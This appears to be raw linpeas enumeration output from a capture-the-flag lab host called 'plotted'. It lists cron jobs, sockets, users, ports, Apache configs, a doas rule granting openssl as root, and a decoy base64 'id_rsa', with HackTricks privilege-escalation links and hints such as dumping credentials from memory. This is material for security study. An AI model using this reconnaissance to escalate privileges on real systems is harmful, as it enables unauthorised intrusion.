root       12545  0.0  0.2 314924  2476 ?        Ssl  16:18   0:00 /usr/lib/upower/upowerd
systemd+   25018  0.0  0.4  26612  4816 ?        Ss   16:20   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   25035  0.0  0.7  23900  7444 ?        Ss   16:20   0:00 /lib/systemd/systemd-resolved
root       25038  0.0  0.8  35008  8476 ?        S<s  16:20   0:01 /lib/systemd/systemd-journald
systemd+   25138  0.0  0.3  90232  3940 ?        Ssl  16:20   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       26486  0.0  0.2 239292  2328 ?        Ssl  16:25   0:00 /usr/lib/accountsservice/accounts-daemon

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                               
                                                                                                           
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information         
COMMAND     PID   TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF    NODE NAME   

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory         
gdm-password Not Found                                                                                     
gnome-keyring-daemon Not Found                                                                             
lightdm Not Found                                                                                          
vsftpd Not Found                                                                                           
apache2 process found (dump creds from memory as root)                                                     
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                     
/bin/crontab                                                                                               
incrontab Not Found
-rw-r--r-- 1 root root    1091 Oct 28  2021 /etc/crontab                                                   

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Oct 28  2021 .
drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  189 Aug 24  2021 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Sep 24 16:44 .
drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
-rwxr-xr-x   1 root root  539 Sep 30  2020 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 May 14  2021 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug 24  2021 .
drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug 24  2021 .
drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Aug 24  2021 .
drwxr-xr-x 101 root root 4096 Sep 24 17:18 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  403 Aug  5  2021 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths             
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                
/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path                    
/etc/systemd/system/multi-user.target.wants/grub-common.service is executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                  
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                     
Sat 2022-09-24 17:39:00 UTC 5min left     Sat 2022-09-24 17:09:00 UTC 24min ago    phpsessionclean.timer        phpsessionclean.service       
Sat 2022-09-24 23:22:06 UTC 5h 48min left Sat 2022-09-24 16:07:01 UTC 1h 26min ago apt-daily.timer              apt-daily.service             
Sun 2022-09-25 00:00:00 UTC 6h left       Sat 2022-09-24 15:48:31 UTC 1h 45min ago logrotate.timer              logrotate.service             
Sun 2022-09-25 00:00:00 UTC 6h left       Sat 2022-09-24 15:48:31 UTC 1h 45min ago man-db.timer                 man-db.service                
Sun 2022-09-25 00:58:22 UTC 7h left       Sat 2022-09-24 16:18:06 UTC 1h 15min ago fwupd-refresh.timer          fwupd-refresh.service         
Sun 2022-09-25 03:10:21 UTC 9h left       Sat 2022-09-24 15:48:31 UTC 1h 45min ago e2scrub_all.timer            e2scrub_all.service           
Sun 2022-09-25 03:22:31 UTC 9h left       Sat 2022-09-24 16:16:26 UTC 1h 17min ago ua-messaging.timer           ua-messaging.service          
Sun 2022-09-25 05:25:03 UTC 11h left      Sat 2022-09-24 16:09:36 UTC 1h 24min ago motd-news.timer              motd-news.service             
Sun 2022-09-25 06:06:03 UTC 12h left      Sat 2022-09-24 16:16:01 UTC 1h 17min ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sun 2022-09-25 16:02:20 UTC 22h left      Sat 2022-09-24 16:02:20 UTC 1h 31min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                                                                        
Mon 2022-09-26 00:00:00 UTC 1 day 6h left Sat 2022-09-24 15:48:31 UTC 1h 45min ago fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a          snapd.snap-repair.timer      snapd.snap-repair.service     

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                  
                                                                                                           
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                 
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core18/2246/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                   
/snap/core18/2246/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                              
/snap/core18/2246/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                             
/snap/core18/2246/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                      
/snap/core18/2246/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                      
/snap/core18/2246/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                                     
/snap/core18/2246/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                  
/snap/core18/2246/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                           
/snap/core18/2246/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                           
/snap/core18/2284/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                   
/snap/core18/2284/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                              
/snap/core18/2284/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                             
/snap/core18/2284/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                      
/snap/core18/2284/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                      
/snap/core18/2284/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                                     
/snap/core18/2284/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                  
/snap/core18/2284/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                           
/snap/core18/2284/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                           
/snap/core20/1169/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                               
/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                          
/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                  
/snap/core20/1169/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                  

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                 
/org/kernel/linux/storage/multipathd                                                                       
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/mysqld/mysqlx.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/mysqld/mysqlx.sock
  └─(Read Write)
/var/snap/lxd/common/lxd/unix.socket

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                   
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                   
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
:1.10                           769 unattended-upgr root             :1.10         unattended-upgrades.service -       -
:1.11                           627 snapd           root             :1.11         snapd.service               -       -
:1.24                         12382 fwupd           root             :1.24         fwupd.service               -       -
:1.25                         12545 upowerd         root             :1.25         upower.service              -       -
:1.35                             1 systemd         root             :1.35         init.scope                  -       -
:1.36                         25018 systemd-network systemd-network  :1.36         systemd-networkd.service    -       -
:1.38                         25035 systemd-resolve systemd-resolve  :1.38         systemd-resolved.service    -       -
:1.39                         25138 systemd-timesyn systemd-timesync :1.39         systemd-timesyncd.service   -       -
:1.44                         26486 accounts-daemon[0m root             :1.44         accounts-daemon.service     -       -
:1.5                            634 udisksd         root             :1.5          udisks2.service             -       -
:1.6                            722 polkitd         root             :1.6          polkit.service              -       -
:1.7                            630 systemd-logind  root             :1.7          systemd-logind.service      -       -
:1.89                         50352 busctl          plot_admin       :1.89         cron.service                -       -
:1.9                            621 networkd-dispat root             :1.9          networkd-dispatcher.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.Accounts      26486 accounts-daemon[0m root             :1.44         accounts-daemon.service     -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      722 polkitd         root             :1.6          polkit.service              -       -
org.freedesktop.UDisks2         634 udisksd         root             :1.5          udisks2.service             -       -
org.freedesktop.UPower        12545 upowerd         root             :1.25         upower.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd         12382 fwupd           root             :1.24         fwupd.service               -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          630 systemd-logind  root             :1.7          systemd-logind.service      -       -
org.freedesktop.network1      25018 systemd-network systemd-network  :1.36         systemd-networkd.service    -       -
org.freedesktop.resolve1      25035 systemd-resolve systemd-resolve  :1.38         systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.35         init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1     25138 systemd-timesyn systemd-timesync :1.39         systemd-timesyncd.service   -       -

                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════    
                                        ╚═════════════════════╝                                            
╔══════════╣ Hostname, hosts and DNS
plotted                                                                                                    
127.0.0.1 localhost
127.0.1.1 plotted

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search eu-west-1.compute.internal

╔══════════╣ Interfaces
```
```text
# symbolic names for networks, see networks(5) for more information                                        
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:2d:24:7d:23:43 brd ff:ff:ff:ff:ff:ff
    inet 10.10.113.202/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2802sec preferred_lft 2802sec
    inet6 fe80::2d:24ff:fe7d:2343/64 scope link 
       valid_lft forever preferred_lft forever

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                              
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*                                       
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      128                  [::]:22              [::]:*            
tcp   LISTEN 0      511                     *:445                *:*            
tcp   LISTEN 0      511                     *:80                 *:*            

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                         
                                                                                                           

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════    
                                         ╚═══════════════════╝                                             
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                   
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)                                          

╔══════════╣ Do I have PGP keys?
/bin/gpg                                                                                                   
netpgpkeys Not Found
netpgp Not Found                                                                                           
                                                                                                           
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                           
                                                                                                           
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                     
ptrace protection is enabled (1)                                                                           
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking doas.conf
permit nopass plot_admin as root cmd openssl                                                               

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2 
                                                                                                           
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                            

╔══════════╣ Users with console
plot_admin:x:1001:1001:,,,:/home/plot_admin:/bin/bash                                                      
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                     
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=113(mysql) gid=118(mysql) groups=118(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 17:34:00 up  1:46,  0 users,  load average: 0.64, 0.28, 1.07                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Thu Jan 27 10:48:26 2022 - Thu Jan 27 10:49:44 2022  (00:01)     0.0.0.0             
plot_admin pts/2        Thu Oct 28 10:14:37 2021 - Thu Oct 28 10:15:01 2021  (00:00)     0.0.0.0
plot_admin pts/2        Thu Oct 28 10:04:15 2021 - Thu Oct 28 10:10:28 2021  (00:06)     0.0.0.0
ubuntu   pts/1        Thu Oct 28 09:51:45 2021 - Thu Oct 28 10:43:45 2021  (00:52)     10.20.1.103
ubuntu   pts/0        Thu Oct 28 07:03:48 2021 - Thu Oct 28 10:44:09 2021  (03:40)     10.20.1.36
ubuntu   tty1         Thu Oct 28 07:00:54 2021 - Thu Oct 28 10:44:15 2021  (03:43)     0.0.0.0
reboot   system boot  Thu Oct 28 06:55:38 2021 - Thu Jan 27 10:49:44 2022 (91+03:54)   0.0.0.0
reboot   system boot  Mon Oct 25 02:08:03 2021 - Thu Jan 27 10:49:44 2022 (94+08:41)   0.0.0.0

wtmp begins Mon Oct 25 02:08:03 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                          
ubuntu           pts/0    10.20.1.36       Fri Jan 28 02:03:27 +0000 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                            
                                                                                                           
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                           

                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════     
                                       ╚══════════════════════╝                                            
╔══════════╣ Useful software
/bin/base64                                                                                                
/bin/curl
/bin/doas
/bin/nc
/bin/netcat
/bin/perl
/bin/php
/bin/ping
/bin/python3
/bin/sudo
/bin/wget

╔══════════╣ Installed Compilers
                                                                                                           
╔══════════╣ MySQL
mysql  Ver 8.0.27-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))                                          

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                 
═╣ MySQL connection using root/NOPASS ................. No                                                 
                                                                                                           
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                            
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                           
-rw------- 1 root root 317 Oct 28  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.41 (Ubuntu)                                                     
Server built:   2022-01-05T14:49:56
httpd Not Found
                                                                                                           
Nginx version: nginx Not Found
                                                                                                           
sh: 2593: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Oct 28  2021 /etc/apache2/sites-enabled                                        
drwxr-xr-x 2 root root 4096 Oct 28  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Oct 28  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                             
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/80
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:445>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/445
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 2787 Oct 28  2021 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/80
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:445>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/445
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Oct 28  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf                                                                                             
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/80
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:445>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/445
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72941 Oct 25  2021 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Oct 25  2021 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 17  2021 /usr/share/doc/rsync/examples/rsyncd.conf                         
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                       
drwxr-xr-x 2 root root 4096 Aug 24  2021 /etc/ldap

drwxr-xr-x 2 root root 32 Oct 15  2021 /snap/core18/2246/etc/ldap

drwxr-xr-x 2 root root 32 Dec 15  2021 /snap/core18/2284/etc/ldap

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                
                                                                                                           
-rw-r--r-- 1 www-data www-data 81 Oct 28  2021 /var/www/html/80/admin/id_rsa
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                 
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core18/2246/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core18/2246/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core18/2246/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core18/2246/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core18/2246/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core18/2246/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core18/2246/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core18/2246/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core18/2246/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core18/2246/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core18/2246/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core18/2246/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core18/2246/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/snap/core18/2246/etc/ssl/certs/ca-certificates.crt
44268PSTORAGE_CERTSBIN

gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
gpg-connect-agent: waiting for the agent to come up ... (5s)
gpg-connect-agent: connection to agent established
══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent.socket                                                    
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                             
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                           

Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 24 16:20 /etc/pam.d                                                        
-rw-r--r-- 1 root root 2133 Jul 23  2021 /etc/pam.d/sshd

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                     
tmux 3.0a                                                                                                  

/tmp/tmux-1001
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3619 May 11  2021 /etc/cloud/cloud.cfg                                              
     lock_passwd: True
-rw-r--r-- 1 root root 3704 Oct  7  2021 /snap/core18/2246/etc/cloud/cloud.cfg
